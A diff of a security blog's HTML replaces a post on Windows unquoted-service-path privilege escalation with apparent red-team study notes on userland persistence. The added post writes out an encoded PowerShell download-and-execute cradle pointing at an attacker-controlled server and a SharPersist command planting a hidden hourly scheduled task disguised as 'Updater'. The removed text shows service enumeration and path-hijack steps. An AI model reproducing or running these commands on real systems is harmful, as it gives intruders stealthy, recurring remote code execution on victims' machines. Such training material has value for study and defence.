@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='How to exploit unquoted path privesc vulnerabilities'>
-<title>Services Unquoted Path Privesc</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Practical examples to achieve persistance on windows machines in userland'>
+<title>Windows Host Persistance Userland</title>
 
-<link rel='canonical' href='https://esquilichi.github.io/p/services-unquoted-path-privesc/'>
+<link rel='canonical' href='https://esquilichi.github.io/p/windows-host-persistance-userland/'>
 
-<link rel="stylesheet" href="/scss/style.min.3b122f5b6a7023e613be9affad843eaceacf4a3383edd177ce41e35501998968.css"><meta property='og:title' content='Services Unquoted Path Privesc'>
-<meta property='og:description' content='How to exploit unquoted path privesc vulnerabilities'>
-<meta property='og:url' content='https://esquilichi.github.io/p/services-unquoted-path-privesc/'>
+<link rel="stylesheet" href="/scss/style.min.3b122f5b6a7023e613be9affad843eaceacf4a3383edd177ce41e35501998968.css"><meta property='og:title' content='Windows Host Persistance Userland'>
+<meta property='og:description' content='Practical examples to achieve persistance on windows machines in userland'>
+<meta property='og:url' content='https://esquilichi.github.io/p/windows-host-persistance-userland/'>
 <meta property='og:site_name' content='esquilichi´s blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Privesc' /><meta property='article:tag' content='CRTO' /><meta property='og:image' content='https://esquilichi.github.io/p/services-unquoted-path-privesc/cover.jpg' />
-<meta name="twitter:title" content="Services Unquoted Path Privesc">
-<meta name="twitter:description" content="How to exploit unquoted path privesc vulnerabilities"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://esquilichi.github.io/p/services-unquoted-path-privesc/cover.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Persistance' /><meta property='article:tag' content='CRTO' /><meta property='article:tag' content='CobaltStrike' /><meta property='og:image' content='https://esquilichi.github.io/p/windows-host-persistance-userland/cover.jpg' />
+<meta name="twitter:title" content="Windows Host Persistance Userland">
+<meta name="twitter:description" content="Practical examples to achieve persistance on windows machines in userland"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://esquilichi.github.io/p/windows-host-persistance-userland/cover.jpg' />
     </head>
     <body class="
     article-page
@@ -248,12 +248,8 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#theory">Theory</a>
-      <ol>
-        <li><a href="#enumeration">Enumeration</a></li>
-      </ol>
-    </li>
-    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#task-scheduler">Task Scheduler</a></li>
   </ol>
 </nav>
         </div>
@@ -268,13 +264,13 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/services-unquoted-path-privesc/">
-                <img src="/p/services-unquoted-path-privesc/cover_hub8cfe4bdb8fa827f670b7396ace41868_113231_800x0_resize_q75_box.jpg"
-                        srcset="/p/services-unquoted-path-privesc/cover_hub8cfe4bdb8fa827f670b7396ace41868_113231_800x0_resize_q75_box.jpg 800w, /p/services-unquoted-path-privesc/cover_hub8cfe4bdb8fa827f670b7396ace41868_113231_1600x0_resize_q75_box.jpg 1600w"
+            <a href="/p/windows-host-persistance-userland/">
+                <img src="/p/windows-host-persistance-userland/cover_hub1032cd8ca1c375dfb8198fac6eae4d1_589108_800x0_resize_q75_box.jpg"
+                        srcset="/p/windows-host-persistance-userland/cover_hub1032cd8ca1c375dfb8198fac6eae4d1_589108_800x0_resize_q75_box.jpg 800w, /p/windows-host-persistance-userland/cover_hub1032cd8ca1c375dfb8198fac6eae4d1_589108_1600x0_resize_q75_box.jpg 1600w"
                         width="800" 
-                        height="800" 
+                        height="765" 
                         loading="lazy"
-                        alt="Featured image of post Services Unquoted Path Privesc" />
+                        alt="Featured image of post Windows Host Persistance Userland" />
                 
             </a>
         </div>
@@ -293,12 +289,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/services-unquoted-path-privesc/">Services Unquoted Path Privesc</a>
+            <a href="/p/windows-host-persistance-userland/">Windows Host Persistance Userland</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            How to exploit unquoted path privesc vulnerabilities
+            Practical examples to achieve persistance on windows machines in userland
         </h3>
         
     </div>
@@ -318,7 +314,7 @@
 
 
                 <time class="article-time--reading">
-                    3 minute read
+                    2 minute read
                 </time>
             </div>
         
@@ -333,85 +329,38 @@
     <section class="article-content">
     
     
-    <h2 id="theory">Theory</h2>
-<p>A Windows <em>service</em> is a special type of application that is usually started automatically when the computer boots.
-They are used to manage core Windows functionality such as <em>Windows Defender</em> or <em>Windows Firewall</em>.
-Many third party applications also install services to manage how they run.</p>
-<p>To create new services we can execute the following command:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">create</span> <span class="n">NewService</span> <span class="n">binpath</span><span class="p">=</span> <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">NewServ</span><span class="p">.</span><span class="py">exe</span> <span class="n">type</span><span class="p">=</span> <span class="n">share</span> <span class="n">start</span><span class="p">=</span> <span class="n">auto</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="enumeration">Enumeration</h3>
-<p>To enumerate services running in a machine, we could use the following commands:</p>
+    <h2 id="introduction">Introduction</h2>
+<p>Persistence is a technique used to continue to have access to a computer that has been compromised, without having to repeat the initial process of gaining access.
+This is important because workstations are often reset or restarted by their users, which would otherwise cause any unauthorized access to be lost.</p>
+<p>To maintain persistence, attackers often need to make changes to the target&rsquo;s configuration or plant a payload on the system.
+This can increase the likelihood of detection, but it is also necessary for long-term operations.
+Balancing the need for persistence with the risk of being discovered can be challenging.</p>
+<p>Common userland persistence methods include:</p>
+<ul>
+<li>HKCU / HKLM Registry Autoruns</li>
+<li>Schedules tasks</li>
+<li>Startup Folder</li>
+</ul>
+<h2 id="task-scheduler">Task Scheduler</h2>
+<p>The Windows Task Scheduler allows us to create tasks that execute on some triggers.
+The trigger can vary on a user logon, idle computer, locked computer, time of the day&hellip;</p>
+<p>We are going to execute a task with a powershell payload one every hour.
+The payload will be base64 encoded and will be hosted on a controlled server.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net start
-</span></span><span class="line"><span class="cl">wmic service list brief
-</span></span><span class="line"><span class="cl">sc query
-</span></span><span class="line"><span class="cl">Get-Service
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">/</span><span class="n">Users</span><span class="p">/</span><span class="n">ismael</span><span class="p">&gt;</span> <span class="nv">$str</span> <span class="p">=</span> <span class="s1">&#39;IEX ((new-object net.webclient).downloadstring(&#34;http://ourserver.com/payload&#34;))&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">/</span><span class="n">Users</span><span class="p">/</span><span class="n">ismael</span><span class="p">&gt;</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBvAHUAcgBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiACkAKQAKAA</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>A sample output of <code>wmic service list brief</code> could be:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\esqui&gt; wmic service list brief
-</span></span><span class="line"><span class="cl">ExitCode  Name                                        ProcessId  StartMode  State    Status
-</span></span><span class="line"><span class="cl">1077      AJRouter                                    0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">1077      ALG                                         0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">1077      AppIDSvc                                    0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">0         Appinfo                                     7652       Manual     Running  OK
-</span></span><span class="line"><span class="cl">1077      AppMgmt                                     0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">1077      AppVClient                                  0          Disabled   Stopped  OK
-</span></span><span class="line"><span class="cl">0         AppXSvc                                     21544      Manual     Running  OK
-</span></span><span class="line"><span class="cl">1077      AssignedAccessManagerSvc                    0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">0         AudioEndpointBuilder                        3528       Auto       Running  OK
-</span></span><span class="line"><span class="cl">0         Audiosrv                                    3652       Auto       Running  OK
-</span></span><span class="line"><span class="cl">1077      autotimesvc                                 0          Manual     Stopped  OK
-</span></span><span class="line"><span class="cl">1077      AxInstSV                                    0          Manual     Stopped  OK
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Later, we can query more information about a specific service.</p>
-<blockquote>
-<p>We need a &ldquo;cmd.exe&rdquo; shell to execute this, because of powershell &ldquo;sc&rdquo; confusion with &ldquo;Set-Content&rdquo;</p>
-</blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> sc qc &lt;service name&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="exploit">Exploit</h2>
-<p>An unquoted service path is where the path to the service binary is not wrapped in quotes.
-This is a very practice, because if two conditions are met, we could privesc.</p>
+</div><p>The tool we are going to use to create the scheduled task is <a class="link" href="https://github.com/mandiant/SharPersist"  target="_blank" rel="noopener"
+    >SharPersist.exe</a>.
+If we are in a CobaltStrike beacon environment, in can be loaded with <code>execute-assembly</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -421,60 +370,29 @@ This is a very practice, because if two conditions are met, we could privesc.</p
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
+</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span> <span class="n">pathname</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SharPersist</span><span class="p">.</span><span class="py">exe</span> <span class="n">-t</span> <span class="n">schtask</span> <span class="n">-c</span> <span class="s2">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> <span class="n">-a</span> <span class="s2">&#34;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBvAHUAcgBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiACkAKQAKAA&#34;</span> <span class="n">-n</span> <span class="s2">&#34;Updater&#34;</span> <span class="n">-m</span> <span class="n">add</span> <span class="n">-o</span> <span class="n">hourly</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Name</span>                    <span class="n">PathName</span>
-</span></span><span class="line"><span class="cl"><span class="n">ALG</span>                     <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">alg</span><span class="p">.</span><span class="py">exe</span>
-</span></span><span class="line"><span class="cl"><span class="n">AppVClient</span>              <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">AppVClient</span><span class="p">.</span><span class="py">exe</span>
-</span></span><span class="line"><span class="cl"><span class="n">Sense</span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="s2">&#34;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">Vulnerable</span>    <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Vulnerable</span> <span class="n">Services</span><span class="p">\</span><span class="n">Service</span> <span class="mf">1</span><span class="p">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Adding</span> <span class="n">scheduled</span> <span class="n">task</span> <span class="n">persistence</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Command</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="mf">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Command</span> <span class="n">Args</span><span class="err">:</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-enc</span> <span class="n">SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Scheduled</span> <span class="n">Task</span> <span class="n">Name</span><span class="err">:</span> <span class="n">Updater</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Option</span><span class="err">:</span> <span class="n">hourly</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">SUCCESS</span><span class="err">:</span> <span class="n">Scheduled</span> <span class="n">task</span> <span class="n">added</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>To exploit a service this way, we need 2 conditions that need to be met:</p>
-<ol>
-<li>The service path must contain spaces and no quotes</li>
-<li>We need writable permissions to one of the folders that Windows will look for an executable</li>
-</ol>
-<p>This happens because Windows, when spaces are met without quotes, interprets the space as a terminator, and will attempt to execute the following:</p>
-<ol>
-<li><code>C:\Program.exe</code></li>
-<li><code>C:\Program Files\Vulnerable.exe</code></li>
-<li><code>C:\Program Files\Vulnerable Services\Service.exe</code></li>
-<li><code>C:\Program Files\Vulnerable Services\Service 1.exe</code></li>
-</ol>
-<p>So, if we have writable permissions to create an evil executable in one of the first places that Windows will search, it will be executed hijacking the service.</p>
-<p>We can check filesystem ACL with the following powershell command</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="s2">&#34;C:\Program Files\Vulnerable Services&#34;</span> <span class="p">|</span> <span class="nb">fl
-</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
-</span></span><span class="line"><span class="cl"><span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">FileSystem</span><span class="p">::</span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Vulnerable</span> <span class="n">Services</span>
-</span></span><span class="line"><span class="cl"><span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Group </span> <span class="err">:</span> <span class="n">DEV</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Users</span>
-</span></span><span class="line"><span class="cl"><span class="n">Access</span> <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span> <span class="n">Allow</span>  <span class="n">CreateFiles</span><span class="p">,</span> <span class="n">Synchronize</span>
-</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">SERVICE</span><span class="p">\</span><span class="n">TrustedInstaller</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">SERVICE</span><span class="p">\</span><span class="n">TrustedInstaller</span> <span class="n">Allow</span>  <span class="mf">268435456</span>
-</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="mf">268435456</span>
-</span></span><span class="line"><span class="cl"><span class="p">.....</span> <span class="n">more</span> <span class="n">info</span> <span class="p">.....</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>BUILTIN/Users have <em>CreateFiles</em> privilege, so we can hijack execution.</p>
+</div><p>Where:</p>
+<ul>
+<li><code>-t</code> is the desired persistence technique.</li>
+<li><code>-c</code> is the command to execute.</li>
+<li><code>-a</code> are any arguments for that command.</li>
+<li><code>-n</code> is the name of the task.</li>
+<li><code>-m</code> is to add the task (you can also <code>remove</code>, <code>check</code> and <code>list</code>).</li>
+<li><code>-o</code> is the task frequency.</li>
+</ul>
+<p>The payload will be executed hourly.</p>
 
 </section>
 
@@ -483,9 +401,11 @@ This is a very practice, because if two conditions are met, we could privesc.</p
     
     <section class="article-tags">
         
-            <a href="/tags/privesc/">Privesc</a>
+            <a href="/tags/persistance/">Persistance</a>
         
             <a href="/tags/crto/">CRTO</a>
+        
+            <a href="/tags/cobaltstrike/">CobaltStrike</a>
         
     </section>
 
@@ -542,23 +462,23 @@ This is a very practice, because if two conditions are met, we could privesc.</p
             
                 
 <article class="has-image">
-    <a href="/p/windows-host-persistance-userland/">
+    <a href="/p/services-unquoted-path-privesc/">
         
         
             <div class="article-image">
-                <img src="/p/windows-host-persistance-userland/cover.ba2dec53fded9c753354d13b76ee791e_hub1032cd8ca1c375dfb8198fac6eae4d1_589108_250x150_fill_q75_box_smart1.jpg" 
+                <img src="/p/services-unquoted-path-privesc/cover.7ee51615270b65d7644da02140b1ccdf_hub8cfe4bdb8fa827f670b7396ace41868_113231_250x150_fill_q75_box_smart1.jpg" 
                         width="250" 
                         height="150" 
                         loading="lazy"
-                        alt="Featured image of post Windows Host Persistance Userland"
+                        alt="Featured image of post Services Unquoted Path Privesc"
                         
-                        data-hash="md5-ui3sU/3tnHUzVNE7du55Hg==">
+                        data-hash="md5-fuUWFScLZddkTaAhQLHM3w==">
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Windows Host Persistance Userland</h2>
+            <h2 class="article-title">Services Unquoted Path Privesc</h2>
         </div>
     </a>
 </article>
